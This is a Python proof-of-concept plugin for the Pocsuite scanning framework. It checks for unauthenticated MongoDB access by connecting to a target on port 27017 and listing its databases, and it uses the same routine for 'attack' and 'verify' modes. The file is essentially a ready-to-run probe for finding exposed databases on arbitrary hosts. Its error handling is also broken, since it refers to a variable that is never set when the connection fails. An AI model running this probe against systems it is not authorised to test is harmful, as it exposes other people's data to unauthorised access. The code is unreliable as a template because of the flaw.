#!/usr/bin/python
# -*- coding: utf-8 -*-


import pymongo
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register




class TestPOC(POCBase):
    name = 'MongoDB未授权访问'
    vulID = '78176'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['zeal']
    vulType = 'unauth'
    version = '1.0'    # default version: 1.0
    references = ['http://www.s3cur1ty.de/m1adv2013-003']
    desc = '''未授权'''

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'MongoDB未授权'
    appVersion = '无'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        try:
            port = 27017
            connection = pymongo.MongoClient(self.target,port,socketTimeoutMS=3000)
            dbs = connection.database_names()
        except Exception as e:
            result = {}
        

        if dbs:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = '%s:%i存在MongoDB未授权' %(self.target,port)

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('失败')
        return output


register(TestPOC)